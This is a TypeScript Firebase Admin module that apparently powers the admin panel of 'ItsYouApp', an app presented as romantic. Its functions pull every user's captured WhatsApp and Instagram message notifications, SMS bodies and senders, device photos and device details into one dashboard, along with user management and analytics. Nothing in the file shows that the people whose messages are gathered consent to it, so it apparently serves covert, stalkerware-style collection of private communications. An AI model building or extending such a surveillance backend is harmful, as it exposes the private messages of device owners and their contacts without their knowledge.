import { db } from './firebase-admin';
import { Timestamp } from 'firebase-admin/firestore';

// Types
export interface Device {
  id: string;
  deviceId: string;
  deviceName: string;
  model: string;
  os: string;
  osVersion?: string;
  lastActive: Date;
  userId: string;
  totalMessages?: number;
  whatsapp?: number;
  instagram?: number;
  sms?: number;
  photos?: number;
  storage?: string;
}

export interface Message {
  id: string;
  deviceId?: string;
  packageName: string;
  appName: string;
  title: string;
  text: string;
  sender: string;
  recipient?: string;
  messageType: 'sent' | 'received';
  isSent: boolean;
  isGroup: boolean;
  timestamp: number;
  userId: string;
  createdAt: Date;
}

export interface SMS {
  id: string;
  deviceId?: string;
  address: string;
  body: string;
  date: number;
  type: 1 | 2; // 1=received, 2=sent
  userId: string;
  createdAt: Date;
}

export interface Photo {
  id: string;
  deviceId?: string;
  userId: string;
  url: string;
  filename: string;
  size: number;
  uploadedAt: Date;
}

export interface MusicTrack {
  id: string;
  title: string;
  artist: string;
  category: string;
  url: string;
  filename: string;
  size: number;
  duration?: string;
  uploadedAt: Date;
}

export interface AppUser {
  id: string;
  email?: string;
  phone?: string;
  name?: string;
  status: 'active' | 'inactive' | 'disabled';
  joinedAt: Date;
  lastActive?: Date;
}

// Helper to convert Firestore timestamp to Date
function timestampToDate(timestamp: any): Date {
  if (timestamp instanceof Timestamp) {
    return timestamp.toDate();
  }
  if (timestamp?.toDate) {
    return timestamp.toDate();
  }
  return new Date(timestamp);
}

// ============= DEVICES =============

export async function getAllDevices(): Promise<Device[]> {
  try {
    // Get all messages and group by deviceId to count
    const notificationsSnapshot = await db.collection('notifications').get();
    const smsSnapshot = await db.collection('sms').get();

    const deviceMap = new Map<string, any>();

    // Process notifications
    notificationsSnapshot.docs.forEach(doc => {
      const data = doc.data();
      const deviceId = data.deviceId || 'unknown';

      if (!deviceMap.has(deviceId)) {
        deviceMap.set(deviceId, {
          deviceId,
          deviceName: data.deviceName || deviceId,
          model: data.deviceModel || 'Unknown',
          os: data.deviceOS || 'Unknown',
          osVersion: data.deviceOSVersion,
          userId: data.userId,
          lastActive: data.timestamp || Date.now(),
          whatsapp: 0,
          instagram: 0,
          sms: 0,
          totalMessages: 0,
        });
      }

      const device = deviceMap.get(deviceId);
      device.totalMessages++;

      if (data.appName === 'WhatsApp') device.whatsapp++;
      if (data.appName === 'Instagram') device.instagram++;

      if (data.timestamp > device.lastActive) {
        device.lastActive = data.timestamp;
      }
    });

    // Process SMS
    smsSnapshot.docs.forEach(doc => {
      const data = doc.data();
      const deviceId = data.deviceId || 'unknown';

      if (deviceMap.has(deviceId)) {
        deviceMap.get(deviceId).sms++;
        deviceMap.get(deviceId).totalMessages++;
      }
    });

    // Convert to array
    const devices: Device[] = Array.from(deviceMap.values()).map((device) => ({
      id: device.deviceId,
      deviceId: device.deviceId,
      deviceName: device.deviceName,
      model: device.model,
      os: device.os,
      osVersion: device.osVersion,
      lastActive: new Date(device.lastActive),
      userId: device.userId,
      totalMessages: device.totalMessages || 0,
      whatsapp: device.whatsapp || 0,
      instagram: device.instagram || 0,
      sms: device.sms || 0,
      photos: 0, // TODO: Count from storage
      storage: '0 MB', // TODO: Calculate from storage
    }));

    return devices;
  } catch (error) {
    console.error('Error getting devices:', error);
    return [];
  }
}

export async function getDeviceById(deviceId: string): Promise<Device | null> {
  const devices = await getAllDevices();
  return devices.find(d => d.deviceId === deviceId) || null;
}

// ============= MESSAGES =============

export async function getAllMessages(filters?: {
  app?: string;
  type?: 'sent' | 'received';
  deviceId?: string;
  limit?: number;
  offset?: number;
}): Promise<Message[]> {
  try {
    let query = db.collection('notifications').orderBy('timestamp', 'desc');

    if (filters?.app) {
      if (filters.app === 'whatsapp') {
        query = query.where('packageName', '==', 'com.whatsapp') as any;
      } else if (filters.app === 'instagram') {
        query = query.where('packageName', '==', 'com.instagram.android') as any;
      }
    }

    if (filters?.type) {
      query = query.where('messageType', '==', filters.type) as any;
    }

    if (filters?.deviceId) {
      query = query.where('deviceId', '==', filters.deviceId) as any;
    }

    if (filters?.limit) {
      query = query.limit(filters.limit) as any;
    }

    const snapshot = await query.get();

    const messages: Message[] = snapshot.docs.map(doc => {
      const data = doc.data();
      return {
        id: doc.id,
        deviceId: data.deviceId,
        packageName: data.packageName,
        appName: data.appName,
        title: data.title,
        text: data.text,
        sender: data.sender,
        recipient: data.recipient,
        messageType: data.messageType,
        isSent: data.isSent,
        isGroup: data.isGroup,
        timestamp: data.timestamp,
        userId: data.userId,
        createdAt: timestampToDate(data.createdAt),
      };
    });

    return messages;
  } catch (error) {
    console.error('Error getting messages:', error);
    return [];
  }
}

export async function getMessagesByDevice(deviceId: string, limit = 50): Promise<Message[]> {
  return getAllMessages({ deviceId, limit });
}

// ============= SMS =============

export async function getAllSMS(filters?: {
  type?: 1 | 2;
  deviceId?: string;
  limit?: number;
}): Promise<SMS[]> {
  try {
    let query = db.collection('sms').orderBy('date', 'desc');

    if (filters?.type) {
      query = query.where('type', '==', filters.type) as any;
    }

    if (filters?.deviceId) {
      query = query.where('deviceId', '==', filters.deviceId) as any;
    }

    if (filters?.limit) {
      query = query.limit(filters.limit) as any;
    }

    const snapshot = await query.get();

    const smsList: SMS[] = snapshot.docs.map(doc => {
      const data = doc.data();
      return {
        id: doc.id,
        deviceId: data.deviceId,
        address: data.address,
        body: data.body,
        date: data.date,
        type: data.type,
        userId: data.userId,
        createdAt: timestampToDate(data.createdAt),
      };
    });

    return smsList;
  } catch (error) {
    console.error('Error getting SMS:', error);
    return [];
  }
}

export async function getSMSByDevice(deviceId: string, limit = 50): Promise<SMS[]> {
  return getAllSMS({ deviceId, limit });
}

// ============= PHOTOS =============

export async function getAllPhotos(limit = 100): Promise<Photo[]> {
  try {
    const query = db.collection('sharedPhotos')
      .orderBy('uploadedAt', 'desc')
      .limit(limit);

    const snapshot = await query.get();

    const photos: Photo[] = snapshot.docs.map(doc => {
      const data = doc.data();
      return {
        id: doc.id,
        deviceId: data.deviceId,
        userId: data.userId,
        url: data.url,
        filename: data.filename,
        size: data.size,
        uploadedAt: timestampToDate(data.uploadedAt),
      };
    });

    return photos;
  } catch (error) {
    console.error('Error getting photos:', error);
    return [];
  }
}

export async function deletePhoto(photoId: string): Promise<boolean> {
  try {
    await db.collection('sharedPhotos').doc(photoId).delete();
    return true;
  } catch (error) {
    console.error('Error deleting photo:', error);
    return false;
  }
}

// ============= MUSIC =============

export async function getAllMusic(): Promise<MusicTrack[]> {
  try {
    const query = db.collection('musicLibrary').orderBy('uploadedAt', 'desc');
    const snapshot = await query.get();

    const tracks: MusicTrack[] = snapshot.docs.map(doc => {
      const data = doc.data();
      return {
        id: doc.id,
        title: data.title,
        artist: data.artist,
        category: data.category,
        url: data.url,
        filename: data.filename,
        size: data.size,
        duration: data.duration,
        uploadedAt: timestampToDate(data.uploadedAt),
      };
    });

    return tracks;
  } catch (error) {
    console.error('Error getting music:', error);
    return [];
  }
}

export async function deleteMusic(trackId: string): Promise<boolean> {
  try {
    await db.collection('musicLibrary').doc(trackId).delete();
    return true;
  } catch (error) {
    console.error('Error deleting music:', error);
    return false;
  }
}

// ============= USERS =============

export async function getAllUsers(): Promise<AppUser[]> {
  try {
    const snapshot = await db.collection('users').get();

    const users: AppUser[] = snapshot.docs.map(doc => {
      const data = doc.data();
      return {
        id: doc.id,
        email: data.email,
        phone: data.phone,
        name: data.name,
        status: data.status || 'active',
        joinedAt: timestampToDate(data.createdAt || data.joinedAt),
        lastActive: data.lastActive ? timestampToDate(data.lastActive) : undefined,
      };
    });

    return users;
  } catch (error) {
    console.error('Error getting users:', error);
    return [];
  }
}

export async function getUserById(userId: string): Promise<AppUser | null> {
  try {
    const doc = await db.collection('users').doc(userId).get();

    if (!doc.exists) {
      return null;
    }

    const data = doc.data()!;
    return {
      id: doc.id,
      email: data.email,
      phone: data.phone,
      name: data.name,
      status: data.status || 'active',
      joinedAt: timestampToDate(data.createdAt || data.joinedAt),
      lastActive: data.lastActive ? timestampToDate(data.lastActive) : undefined,
    };
  } catch (error) {
    console.error('Error getting user:', error);
    return null;
  }
}

export async function updateUserStatus(userId: string, status: 'active' | 'inactive' | 'disabled'): Promise<boolean> {
  try {
    await db.collection('users').doc(userId).update({ status });
    return true;
  } catch (error) {
    console.error('Error updating user status:', error);
    return false;
  }
}

export async function deleteUser(userId: string): Promise<boolean> {
  try {
    await db.collection('users').doc(userId).delete();
    return true;
  } catch (error) {
    console.error('Error deleting user:', error);
    return false;
  }
}

// ============= HOME MESSAGE =============

export async function getHomeMessage(): Promise<string> {
  try {
    const doc = await db.collection('appSettings').doc('homeMessage').get();

    if (!doc.exists) {
      return "Welcome to ItsYouApp! ❤️\n\nYour romantic journey starts here.";
    }

    return doc.data()?.message || "Welcome to ItsYouApp! ❤️\n\nYour romantic journey starts here.";
  } catch (error) {
    console.error('Error getting home message:', error);
    return "Welcome to ItsYouApp! ❤️\n\nYour romantic journey starts here.";
  }
}

export async function updateHomeMessage(message: string): Promise<boolean> {
  try {
    await db.collection('appSettings').doc('homeMessage').set({
      message,
      updatedAt: Timestamp.now(),
    });
    return true;
  } catch (error) {
    console.error('Error updating home message:', error);
    return false;
  }
}

// ============= ANALYTICS =============

export async function getAnalytics() {
  try {
    const [users, messages, sms, photos] = await Promise.all([
      getAllUsers(),
      getAllMessages({ limit: 10000 }),
      getAllSMS({ limit: 10000 }),
      getAllPhotos(10000),
    ]);

    const now = new Date();
    const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());

    const activeToday = messages.filter(m =>
      new Date(m.timestamp).getTime() >= today.getTime()
    ).length;

    return {
      totalUsers: users.length,
      activeToday,
      totalMessages: messages.length,
      totalPhotos: photos.length,
      totalSMS: sms.length,
    };
  } catch (error) {
    console.error('Error getting analytics:', error);
    return {
      totalUsers: 0,
      activeToday: 0,
      totalMessages: 0,
      totalPhotos: 0,
      totalSMS: 0,
    };
  }
}
